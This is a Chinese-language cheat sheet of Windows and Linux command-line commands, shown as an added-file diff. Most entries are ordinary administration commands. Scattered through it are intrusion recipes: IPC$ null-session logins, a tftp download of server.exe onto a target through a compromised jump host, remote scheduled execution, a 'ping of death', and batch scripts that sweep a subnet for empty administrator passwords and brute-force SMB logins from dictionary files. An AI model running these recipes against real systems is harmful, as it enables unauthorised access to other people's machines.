@@ -1,0 +1,869 @@
+记事本	notepad
+计算器	calc
+画图	mspaint
+写字板	write
+Windows放大镜	magnify
+辅助工具管理器	utilman
+Telnet客户端	telnet
+任务管理器	taskmgr
+关闭Windows	shutdown
+扫描仪与相机	sticpl.cpl
+远程桌面	mstsc
+可移动存储	ntmsmgr.msc
+注册表编辑器	regedit
+TrueType造字程序	eudcedit
+打印机文件夹	printers
+打印机和传真	control printers
+控制面板	control
+屏幕键盘	osk
+网络连接	ncpa.cpl 或control netconnections
+从Windows注销	logoff
+字体文件夹	fonts 或control fonts
+磁盘管理	diskmgmt.msc
+快速查找	findfast.cpl
+磁盘碎片整理程序	dfrg.msc
+磁盘检查工具	chkdsk
+磁盘清理工具	cleanmgr
+命令行提示符	cmd
+剪贴簿查看器	clipbrd
+辅助功能选项	access.cpl
+添加硬件向导	hdwwiz.cpl
+添加或删除程序	appwiz.cpl
+
+
+常用管理配置工具
+设备管理器	devmgmt.msc
+Direct X控制面板(如果已经安装)	directx.cpl
+Direct X诊断工具	dxdiag
+磁盘分区管理器	diskpart
+显示属性	desk.cpl 或 control desktop
+文件夹选项	control folders
+显示属性的外观选项卡	control color
+文件签名验证	sigverif
+IP配置实用程序	ipconfig
+键盘属性	control keyboard
+鼠标属性	main.cpl 或 control mouse
+Internet属性	inetcpl.cpl
+密码属性	assword.cpl
+电话与调制解调器选项	telephon.cpl
+电源选项属性	powercfg.cpl
+性能	perfmon
+区域和语言选项	intl.cpl
+系统属性	sysdm.cpl
+用户帐户管理	nusrmgr.cpl
+Windows防火墙	firewall.cpl
+运行Windows更新	wupdmgr
+系统配置实用程序	msconfig
+声音和音频设备属性	mmsys.cpl
+共享文件夹	fsmgmt.msc
+服务	services.msc
+Windows安全中心	wscui.cpl
+任务计划	control schedtasks
+游戏控制	joy.cpl
+字符映射表	charmap
+证书管理控制台	certmgr.msc
+
+
+一些高级配置管理
+Windows管理体系结构	wmimgmt.msc
+Windows系统安全工具	syskey
+系统配置编辑器	sysedit
+策略的结果集	rsop.msc
+可移动存储	ntmsmgr.msc
+可移动存储操作请求	ntmsoprq.msc
+ODBC数据源管理器	odbccp32.cpl
+本地安全设置	secpol.msc
+本地用户和组	lusrmgr.msc
+索引服务	ciadv.msc
+组策略编辑器	gpedit.msc
+事件查看器	eventvwr.msc
+Driver Verifier Manager	verifier
+Dr. Watson系统诊断工具	drwtsn32
+显示连接配置 ipconfig /all
+显示DNS缓存内容 ipconfig /displaydns
+去除DNS缓存内容 ipconfig /flushdns
+释放全部(或指定)适配器的由DHCP分配的动态IP地址) ipconfig /release
+为全部适配器重新分配IP地址 ipconfig /renew
+刷新DHCP并重新注册DNS ipconfig /registerdns
+显示DHCP Class ID ipconfig /showclassid
+修改DHCP Class ID ipconfig /setclassid
+关机操作shutdown命令
+Shutdown使您能够一次关闭或重新启动一台本地或远程计算机
+
+shutdown [/i | /l | /s | /r | /a | /p | /h | /e] [/f] [/m //computername/] [/t XXX] [/d [p:]XX:YY/c"Comment"]
+
+参数：
+
+/i : 显示“远程关机对话框”。/i 选项必须是键入的第一个参数，之后的所有参数都将被忽略。
+/l : 立即注销当前用户，没有超时期限。不能将 /l 与 /m //computername/ 或 /t 一起使用。
+/s : 关闭计算机。
+/r : 关机后重新启动计算机。
+/a : 取消关机操作（仅在超时期限内有效）。a 参数仅可以与 /m //computername/ 一起使用。
+/p : 仅关闭本地计算机（而不是远程计算机），没有超时期或警告。/p 只能和 /d 一起使用。如果您的计算机不支持关闭电源功能，使用 /p 将关闭系统但不会切断您的计算机电源。
+/h : 使本地计算机处于休眠状态（如果已启用休眠）。仅可将 h 与 /f 一起使用。
+/e : 允许在目标计算机上记录意外关机原因。
+/f : 强制关闭正在运行的应用程序而不提前警告用户。
+/t：设置经过过长时间进行当次操作，定时功能，时间单位为秒
+举例：
+
+立即关机：shutdown -s -t 0
+30秒后重启：shutdown -r -t 30
+取消关机：shutdown -a
+网络连接查看命令netstat
+netstat -a 查看开启了哪些端口,常用netstat -an
+netstat -n 查看端口的网络连接情况，常用netstat -an
+netstat -v 查看正在进行的工作
+netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）
+netstat -s 查看正在使用的所有协议使用情况
+系统网络服务命令net
+netstat -a 查看开启了哪些端口,常用netstat -an
+net use //ip/ipc$ " " /user:" " 建立IPC空链接
+net use //ip/ipc$ "密码" /user:"用户名" 建立IPC非空链接
+net use h: //ip/c$ "密码" /user:"用户名" 直接登陆后映射对方C：到本地为H:
+net use h: //ip/c$ 登陆后映射对方C：到本地为H:
+net use //ip/ipc$ /del 删除IPC链接
+net use h: /del 删除映射对方到本地的为H:的映射
+net user 用户名 密码 /add 建立用户
+net user guest /active:yes 激活guest用户
+net user 查看有哪些用户
+net user 帐户名 查看帐户的属性
+net localgroup administrators 用户名 /add 把"用户"添加到管理员中使其具有管理员权限,注意：administrator后加s用复数
+net start 查看开启了哪些服务
+net start 服务名 开启服务；(如:net start telnet， net start schedule)
+net stop 服务名 停止某服务
+net time //目标ip 查看对方时间
+net time //目标ip /set 设置本地计算机时间与"目标IP"主机的时间同步,加上参数/yes可取消确认信息
+net view 查看本地局域网内开启了哪些共享
+net view //ip 查看对方局域网内开启了哪些共享
+net config 显示系统网络设置
+net logoff 断开连接的共享
+net pause 服务名 暂停某服务
+net send ip "文本信息" 向对方发信息
+net ver 局域网内正在使用的网络连接类型和信息
+net share 查看本地开启的共享
+net share ipc$ 开启ipc$共享
+net share ipc$ /del 删除ipc$共享
+net share c$ /del 删除C：共享
+net user guest 12345 用guest用户登陆后用将密码改为12345
+net password 密码 更改系统登陆密码
+系统服务命令sc
+SC来控制系统创建服务和管理服务。
+
+
+SC使用这样的语法：
+
+sc <server> [command] [service name] <option1> <option2>…
+
+下面介绍各种参数。
+
+server ：可选，可以使用双斜线，如myserver ，也可以是192.168.0.1 来操作远程计算机。如 果在本地计算机上操作就不用添加任何参数。
+command：下面列出SC可以使用的命令
+config—-改变一个服务的配置。（长久的）
+continue–对一个服务送出一个继续控制的要求。
+control—-对一个服务送出一个控制。
+create—-创建一个服务。（增加到注册表中）
+delete—-删除一个服务。（从注册表中删除）
+EnumDepend–列举服务的从属关系。
+GetDisplayName–获得一个服务的显示名称。
+GetKeyName–获得一个服务的服务键名。
+interrogate–对一个服务送出一个询问控制要求。
+pause—-对一个服务送出一个暂停控制要求。
+qc—-询问一个服务的配置。
+query—-询问一个服务的状态，也可以列举服务的状态类型。
+start—-启动一个服务。
+stop—-对一个服务送出一个停止的要求。
+service name：在注册表中为service key制定的名称。注意这个名称是不同于显示名称的（这个名称可以用net start和服务控制面板看到），而SC是使用服务键名来鉴别服务的。
+特别说明 ：SC create 子 命令
+这个命令可以在注册表和服务控制管理数据库建立一个入口。使用语法如下：
+
+sc <server> create [service name] [binPath= ] <option1> <option2>…
+
+这里的servername，servicename，optionname，optionvalues和上面的一样，这里就option描述，通 常为键值对应：option name = option values 。
+
+注：键值对应 name= value，等号后面应由一个空格，不能省略
+
+option 详细描述如下：
+
+type=—-own, share, interact, kernel, filesys
+关于建立服务的类型， 选项值包括驱动程序使用的类型，默认是share。
+start=—-boot, sys tem, auto, demand, disabled
+关于启动服务的类 型，选项值包括驱动程序使用的类型，默认是demand（手动）。
+error=—-normal, severe, critical, ignore
+当服务在导入失败错误的严重 性，默认是normal。
+binPath=–(string)
+服务二进制文件的路径名，这里没有默认值，这个字符串是必须设置的。
+group=—-(string)
+这个服务属于的组，这个组的列表保存在注册表中的 ServiceGroupOrder下。默认是nothing。
+tag=—-(string)
+如果这个字符串被设置为yes，sc可以从CreateService call中得到一个tagId。然而，SC并不显示这个标签，所以使用这个没有多少意义。默认是nothing
+depend=—-(space separated string)有空格的字符串。
+在这个服务启动前必须启动的 服务的名称或者是组。
+obj=—-(string)
+账号运行使用的名称，也可以说是登陆身份。默认是localsys tem
+Displayname=–(string)
+一个为在用户界面程序中鉴别各个服务使用的字符串。
+password=–(string)
+一个密码，如果一个不同于localsys tem的账号使用时需要使用这个。
+Optionvalues
+Optionname参数名称的数值列表。参考optionname。当我们输入一个字符 串时，如果输入一个空的引用这意味着一个空的字符串将被导入。
+举例说明：在一台叫做（myserver ）的计算机上为一个叫“NewService”的服务建立的一个注册表登记，命令如下：
+
+sc myserver create MyService binpath= C:/NewServ.exe
+
+windows dos常用命令大全详解
+
+copy \\ip\admin$\svv.exe c:\ 或:copy\\ip\admin$\*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：
+xcopy 要复制的文件或目录树　目标地址\目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件
+tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:\server.exe 登陆后，将"IP"的server.exe下载到目标主机c:\server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送
+tftp -i 对方IP　put c:\server.exe 登陆后，上传本地c:\server.exe至主机
+ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；
+默认为ASCII格式传送(文本文件时)
+route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface
+arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息
+start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令
+mem 查看cpu使用情况
+attrib 文件名(目录名) 查看某文件（目录）的属性
+attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用＋则是添加为某属性
+dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间
+date /t 、 time /t 使用此参数即"DATE/T"、"TIME/T"将只显示当前日期和时间，而不必输入新日期和时间
+set 指定环境变量名称=要指派给变量的字符 设置环境变量
+set 显示当前所有的环境变量
+set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量
+pause 暂停批处理程序，并显示出：请按任意键继续....
+if 在批处理程序中执行条件处理（更多说明见if命令及变量）
+goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如："：start"标签）
+call 路径\批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）
+for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）
+echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置
+echo 信息 在屏幕上显示出信息
+echo 信息 >> pass.txt 将"信息"保存到pass.txt文件中
+findstr "Hello" aa.txt 在aa.txt文件中寻找字符串hello
+find 文件名 查找某文件
+
+cmd中查找文件和文件内容
+2018年07月20日 14:24:36 ferghs 阅读数：4199
+1、在cmd中查找文件，例如在c盘下查找3.txt
+
+dir c:\3.txt /s /b
+
+/s 显示指定目录和所有子目录中的文件。
+
+/b 使用空格式(没有标题信息或摘要)。
+
+2、查找d盘aaa目录下包含abc的所有文件
+
+findstr /s /n "abc" d:\aaa\*
+
+/s 在当前目录和所有子目录中搜索匹配文件。
+
+/n  在匹配的每行前打印行数。
+
+3、查找可执行文件使用where命令，类似linux下的which命令
+
+C:\>where cmd
+C:\Windows\System32\cmd.exe
+ 4、文件中搜索字符串
+
+find /N /I "pid" 555.txt  // 在5.txt文件中忽略大小写查找pid字符串，并带行号显示查找后的结果
+
+C:\Users\Desktop\gitRoot\hah>find /N /I "pid" 555.txt
+
+---------- 555.TXT
+[2]pidd
+[4]pidpid
+/N 显示行号。
+
+/I 搜索字符串时忽略大小写。
+
+/C 仅显示包含字符串的行数。
+
+/V 显示所有未包含指定字符串的行。
+
+有关某个命令的详细信息，请键入 HELP 命令名
+ASSOC          显示或修改文件扩展名关联。
+ATTRIB         显示或更改文件属性。
+BREAK          设置或清除扩展式 CTRL+C 检查。
+BCDEDIT        设置启动数据库中的属性以控制启动加载。
+CACLS          显示或修改文件的访问控制列表(ACL)。
+CALL           从另一个批处理程序调用这一个。
+CD             显示当前目录的名称或将其更改。
+CHCP           显示或设置活动代码页数。
+CHDIR          显示当前目录的名称或将其更改。
+CHKDSK         检查磁盘并显示状态报告。
+CHKNTFS        显示或修改启动时间磁盘检查。
+CLS            清除屏幕。
+CMD            打开另一个 Windows 命令解释程序窗口。
+COLOR          设置默认控制台前景和背景颜色。
+COMP           比较两个或两套文件的内容。
+COMPACT        显示或更改 NTFS 分区上文件的压缩。
+CONVERT        将 FAT 卷转换成 NTFS。您不能转换
+               当前驱动器。
+COPY           将至少一个文件复制到另一个位置。
+DATE           显示或设置日期。
+DEL            删除至少一个文件。
+DIR            显示一个目录中的文件和子目录。
+DISKCOMP       比较两个软盘的内容。
+DISKCOPY       将一个软盘的内容复制到另一个软盘。
+DISKPART       显示或配置磁盘分区属性。
+DOSKEY         编辑命令行、调用 Windows 命令并创建宏。
+DRIVERQUERY    显示当前设备驱动程序状态和属性。
+ECHO           显示消息，或将命令回显打开或关上。
+ENDLOCAL       结束批文件中环境更改的本地化。
+ERASE          删除一个或多个文件。
+EXIT           退出 CMD.EXE 程序(命令解释程序)。
+FC             比较两个文件或两个文件集并显示它们之间的不同。
+FIND           在一个或多个文件中搜索一个文本字符串。
+FINDSTR        在多个文件中搜索字符串。
+FOR            为一套文件中的每个文件运行一个指定的命令。
+FORMAT         格式化磁盘，以便跟 Windows 使用。
+FSUTIL         显示或配置文件系统的属性。
+FTYPE          显示或修改用在文件扩展名关联的文件类型。
+GOTO           将 Windows 命令解释程序指向批处理程序
+               中某个带标签的行。
+GPRESULT       显示机器或用户的组策略信息。
+GRAFTABL       启用 Windows 在图形模式显示扩展字符集。
+HELP           提供 Windows 命令的帮助信息。
+ICACLS         显示、修改、备份或还原文件和
+ 目录的 ACL。
+IF             在批处理程序中执行有条件的处理过程。
+LABEL          创建、更改或删除磁盘的卷标。
+MD             创建一个目录。
+MKDIR          创建一个目录。
+MKLINK         创建符号链接和硬链接
+MODE           配置系统设备。
+MORE           逐屏显示输出。
+MOVE           将一个或多个文件从一个目录移动到另一个目录。
+OPENFILES      显示远程用户为了文件共享而打开的文件。
+PATH           为可执行文件显示或设置搜索路径。
+PAUSE          停止批处理文件的处理并显示信息。
+POPD           还原由 PUSHD 保存的当前目录上一次的值。
+PRINT          打印一个文本文件。
+PROMPT         改变 Windows 命令提示。
+PUSHD          保存当前目录，然后对其进行更改。
+RD             删除目录。
+RECOVER        从损坏的磁盘中恢复可读取的信息。
+REM            记录批处理文件或 CONFIG.SYS 中的注释。
+REN            重新命名文件。
+RENAME         重新命名文件。
+REPLACE        替换文件。
+RMDIR          删除目录。
+ROBOCOPY       复制文件和目录树的高级实用程序
+SET            显示、设置或删除 Windows 环境变量。
+SETLOCAL       开始用批文件改变环境的本地化。
+SC             显示或配置服务(后台处理)。
+SCHTASKS       安排命令和程序在一部计算机上按计划运行。
+SHIFT          调整批处理文件中可替换参数的位置。
+SHUTDOWN       让机器在本地或远程正确关闭。
+SORT           将输入排序。
+START          打开单独视窗运行指定程序或命令。
+SUBST          将驱动器号与路径关联。
+SYSTEMINFO     显示机器的具体的属性和配置。
+TASKLIST       显示包括服务的所有当前运行的任务。
+TASKKILL       终止正在运行的进程或应用程序。
+TIME           显示或设置系统时间。
+TITLE          设置 CMD.EXE 会话的窗口标题。
+TREE           以图形显示启动器或路径的目录结构。
+TYPE           显示文本文件的内容。
+VER            显示 Windows 的版本。
+VERIFY         告诉 Windows 验证文件是否正确写入磁盘。
+VOL            显示磁盘卷标和序列号。
+XCOPY          复制文件和目录树。
+WMIC           在交互命令外壳里显示 WMI 信息。
+
+
+
+title 标题名字 更改CMD窗口标题名字
+color 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白
+prompt 名称 更改cmd.exe的显示的命令提示符(把C:\、D:\统一改为：EntSky\ )
+net use \\ip\ipc$ " " /user:" " 建立IPC空链接
+net use \\ip\ipc$ "密码" /user:"用户名" 建立IPC非空链接
+net use h: \\ip\c$ "密码" /user:"用户名" 直接登陆后映射对方C：到本地为H:
+net use h: \\ip\c$ 登陆后映射对方C：到本地为H:
+net use \\ip\ipc$ /del 删除IPC链接
+net use h: /del 删除映射对方到本地的为H:的映射
+net user 用户名　密码　/add 建立用户
+net user guest /active:yes 激活guest用户
+net user 查看有哪些用户
+net user 帐户名 查看帐户的属性
+net localgroup administrators 用户名 /add 把"用户"添加到管理员中使其具有管理员权限,注意：administrator后加s用复数
+net start 查看开启了哪些服务
+net start 服务名　 开启服务；(如:net start telnet， net start schedule)
+net stop 服务名 停止某服务
+net time \\目标ip 查看对方时间
+net time \\目标ip /set 设置本地计算机时间与"目标IP"主机的时间同步,加上参数/yes可取消确认信息
+net view 查看本地局域网内开启了哪些共享
+net view \\ip 查看对方局域网内开启了哪些共享
+net config 显示系统网络设置
+net logoff 断开连接的共享
+net pause 服务名 暂停某服务
+net send ip "文本信息" 向对方发信息
+net ver 局域网内正在使用的网络连接类型和信息
+net share 查看本地开启的共享
+net share ipc$ 开启ipc$共享
+net share ipc$ /del 删除ipc$共享
+net share c$ /del 删除C：共享
+net user guest 12345 用guest用户登陆后用将密码改为12345
+net password 密码 更改系统登陆密码
+netstat -a 查看开启了哪些端口,常用netstat -an
+netstat -n 查看端口的网络连接情况，常用netstat -an
+netstat -v 查看正在进行的工作
+netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）
+netstat -s 查看正在使用的所有协议使用情况
+nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写
+tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数："-w数字"用于设置超时间隔。
+ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)
+ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数"/all"显示全部配置信息
+tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)
+kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)
+del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如"DEL/AR *.*"表示删除当前目录下所有只读文件，"DEL/A-S *.*"表示删除当前目录下除系统文件以外的所有文件
+#2 二：
+del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）
+move 盘符\路径\要移动的文件名　存放移动文件的路径\移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖
+fc one.txt two.txt > 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，"> "和"> >" 是重定向命令
+at id号 开启已注册的某个计划任务
+at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止
+at id号 /delete 停止某个已注册的计划任务
+at 查看所有的计划任务
+at \\ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机
+finger username @host 查看最近有哪些用户登陆
+telnet ip 端口 远和登陆服务器,默认端口为23
+open ip 连接到IP（属telnet登陆后的命令）
+telnet 在本机上直接键入telnet 将进入本机的telnet
+copy 路径\文件名1　路径\文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件
+copy c:\srv.exe \\ip\admin$ 复制本地c:\srv.exe到对方的admin下
+cppy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件
+ver 在DOS窗口下显示版本信息
+winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）
+format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS
+md　目录名 创建目录
+replace 源文件　要替换文件的目录 替换文件
+ren 原文件名　新文件名 重命名文件名
+tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称
+type 文件名 显示文本文件的内容
+more 文件名 逐屏显示输出文件
+doskey 要锁定的命令＝字符
+doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=
+taskmgr 调出任务管理器
+chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误
+tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口
+exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe
+path 路径\可执行文件的文件名 为可执行文件设置一个路径。
+cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?
+regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；
+regedit /e 注册表文件名 导出注册表
+cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D:\test.txt /D pub 设定d:\test.txt拒绝pub用户访问。
+cacls 文件名 查看文件的访问用户权限列表
+REM 文本内容 在批处理文件中添加注解
+netsh 查看或更改本地网络配置情况
+#4 四：
+IIS服务命令：
+iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现）
+iisreset /start或stop 启动（停止）所有Internet服务
+iisreset /restart 停止然后重新启动所有Internet服务
+iisreset /status 显示所有Internet服务状态
+iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动
+iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机
+iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务
+iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。
+FTP 命令： (后面有详细说明内容)
+ftp的命令行格式为:
+ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。
+－d 使用调试方式。
+－n 限制ftp的自动登录,即不使用.netrc文件。
+－g 取消全局文件名。
+help [命令] 或 ？[命令] 查看命令说明
+bye 或 quit 终止主机FTP进程,并退出FTP管理方式.
+pwd 列出当前远端主机目录
+put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中
+get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中
+mget [remote-files] 从远端主机接收一批文件至本地主机
+mput local-files 将本地主机中一批文件传送至远端主机
+dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件
+ascii 设定以ASCII方式传送文件(缺省值)
+bin 或 image 设定以二进制方式传送值)
+bin 或 image 设定以二进制方式传送文件
+bell 每完成一次文件传送,报警提示
+cdup 返回上一级目录
+close 中断与远程服务器的ftp会话(与open对应)
+open host[port] 建立指定ftp服务器连接,可指定连接端口
+delete 删除远端主机中的文件
+mdelete [remote-files] 删除一批文件
+mkdir directory-name 在远端主机中建立目录
+rename [from] [to] 改变远端主机中的文件名
+rmdir directory-name 删除远端主机中的目录
+status 显示当前FTP的状态
+system 显示远端主机系统类型
+user user-name [password] [account] 重新以别的用户名登录远端主机
+open host [port] 重新建立一个新的连接
+prompt 交互提示模式
+macdef 定义宏命令
+lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录
+chmod 改变远端主机的文件权限
+case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母
+cd remote－dir 进入远程主机目录
+cdup 进入远程主机目录的父目录
+! 在本地机中执行交互shell，exit回到ftp环境,如!ls＊.zip
+MYSQL 命令：
+mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。
+（例：mysql -h110.110.110.110 -Uroot -P123456
+注:u与root可以不用加空格，其它也一样）
+exit 退出MYSQL
+mysqladmin -u用户名 -p旧密码 password 新密码 修改密码
+grant select on 数据库.* to 用户名@登录主机 identified by \"密码\"; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符）
+show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。
+use mysql；
+show tables; 显示库中的数据表
+describe 表名; 显示数据表的结构
+create database 库名; 建库
+use 库名；
+create table 表名 (字段设定列表)； 建表
+drop database 库名;
+drop table 表名； 删库和删表
+delete from 表名; 将表中记录清空
+select * from 表名; 显示表中的记录
+mysqldump --opt school>school.bbb 备份数据库：（命令在DOS的\\mysql\\bin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。
+win2003系统下新增命令（实用部份）：
+shutdown /参数 关闭或重启本地或远程主机。
+参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。
+例：shutdown /r /t 0 立即重启本地主机（无延时）
+taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。
+参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。
+tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。
+参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。
+
+
+
+
+#6 六：
+Linux系统下基本命令： 要区分大小写
+uname 显示版本信息（同win2K的 ver）
+dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir）
+pwd 查询当前所在的目录位置
+cd cd　..回到上一层目录，注意cd 与..之间有空格。cd　/返回到根目录。
+cat 文件名 查看文件内容
+cat >abc.txt 往abc.txt文件中写上内容。
+more 文件名 以一页一页的方式显示一个文本文件。
+cp 复制文件
+mv 移动文件
+rm 文件名 删除文件，rm -a 目录名删除目录及子目录
+mkdir 目录名 建立目录
+rmdir 删除子目录，目录内没有文档。
+chmod 设定档案或目录的存取权限
+grep 在档案中查找字符串
+diff 档案文件比较
+find 档案搜寻
+date 现在的日期、时间
+who 查询目前和你使用同一台机器的人以及Login时间地点
+w 查询目前上机者的详细资料
+whoami 查看自己的帐号名称
+groups 查看某人的Group
+passwd 更改密码
+history 查看自己下过的命令
+ps 显示进程状态
+kill 停止某进程
+gcc 黑客通常用它来编译C语言写的文件
+su 权限转换为指定使用者
+telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。
+ftp ftp连接上某服务器（同win2K）
+附：批处理命令与变量
+1：for命令及变量 基本格式：
+FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。
+批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use \\ip\ipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3
+(set):指定一个或一组文件，可使用通配符，如：(D:\user.txt)和(1 1 254)(1 -1 254),{ "(1 1 254)"第一个"1"指起始值，第二个"1"指增长量，第三个"254"指结束值，即：从1到254；"(1 -1 254)"说明：即从254到1 }
+command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：& 来隔开
+command_parameters：为特定命令指定参数或命令行开关
+IN (set)：指在(set)中取值；DO command ：指执行command
+参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:\pass.txt)时 }。
+用法举例：
+@echo off
+echo 用法格式：test.bat *.*.* > test.txt
+for /L %%G in (1 1 254) do echo %1.%%G >>test.txt & net use \\%1.%%G /user:administrator | find "命令成功完成" >>test.txt
+存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。
+/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：*.*.*为批处理默认的 %1；%%G 为变量(ip的最后一位）；& 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有"命令成功完成"信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。
+@echo off
+echo 用法格式：ok.bat ip
+FOR /F %%i IN (D:\user.dic) DO smb.exe %1 %%i D:\pass.dic 200
+存为：ok.exe 说明：输入一个IP后，用字典文件d:\pass.dic来暴解d:\user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。
+2：if命令及变量 基本格式：
+IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为"真"。
+例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。
+0 指发现并成功执行（真）；1 指没有发现、没执行（假）。
+IF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。
